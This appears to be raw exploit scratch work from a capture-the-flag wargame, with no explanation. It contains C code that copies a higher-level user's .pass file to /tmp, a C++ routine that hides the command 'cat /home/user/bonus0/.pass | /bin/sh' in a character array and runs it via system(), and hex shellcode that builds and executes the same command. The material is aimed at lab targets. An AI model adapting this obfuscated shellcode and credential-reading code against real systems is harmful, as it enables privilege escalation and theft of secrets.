#include "stdio.h"

int n(void *a, void *b)
{
	FILE *d = fopen("/home/user/level9/.pass", "r");
	FILE *t = fopen("/tmp/out", "w");
	char buff[256];
	fread(buff, 1, 256, d);
	fwrite(buff, 1, 256, t);
	return 0;
}

void main()
{
	n(0,0);
}

{'c','a','t',' ','/','h','o','m','e','/','u','s','e','r','/','b','o','n','u','s','0','/','.','p','a','s','s',' ','|',' ','/','b','i','n','/','s','h','>','/','t','m','p','/','a'1}

#include <cstdlib>
int run(void *a, void *b)
{
        char r[45] = {'c','a','t',' ','/','h','o','m','e','/','u','s','e','r','/','b','o','n','u','s','0','/','.','p','a','s','s',' ','|',' ','/','b','i','n','/','s','h','>','/','t','m','p','/','a', 1};
        --r[44];
        system(r);
}

int main()
{
        run(0, 0);
}



\x55\x89\xe5\x83\xec\x48\xc6\x45\xcb\x63\xc6\x45\xcc\x61\xc6\x45\xcd\x74\xc6\x45\xce\x20\xc6\x45\xcf\x2f\xc6\x45\xd0\x68\xc6\x45\xd1\x6f\xc6\x45\xd2\x6d\xc6\x45\xd3\x65\xc6\x45\xd4\x2f\xc6\x45\xd5\x75\xc6\x45\xd6\x73\xc6\x45\xd7\x65\xc6\x45\xd8\x72\xc6\x45\xd9\x2f\xc6\x45\xda\x62\xc6\x45\xdb\x6f\xc6\x45\xdc\x6e\xc6\x45\xdd\x75\xc6\x45\xde\x73\xc6\x45\xdf\x30\xc6\x45\xe0\x2f\xc6\x45\xe1\x2e\xc6\x45\xe2\x70\xc6\x45\xe3\x61\xc6\x45\xe4\x73\xc6\x45\xe5\x73\xc6\x45\xe6\x20\xc6\x45\xe7\x7c\xc6\x45\xe8\x20\xc6\x45\xe9\x2f\xc6\x45\xea\x62\xc6\x45\xeb\x69\xc6\x45\xec\x6e\xc6\x45\xed\x2f\xc6\x45\xee\x73\xc6\x45\xef\x68\xc6\x45\xf0\x3e\xc6\x45\xf1\x2f\xc6\x45\xf2\x74\xc6\x45\xf3\x6d\xc6\x45\xf4\x70\xc6\x45\xf5\x2f\xc6\x45\xf6\x61\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xcb\x89\x04\x24\xe8\x4d\xfe\xff\xffc9\xc3
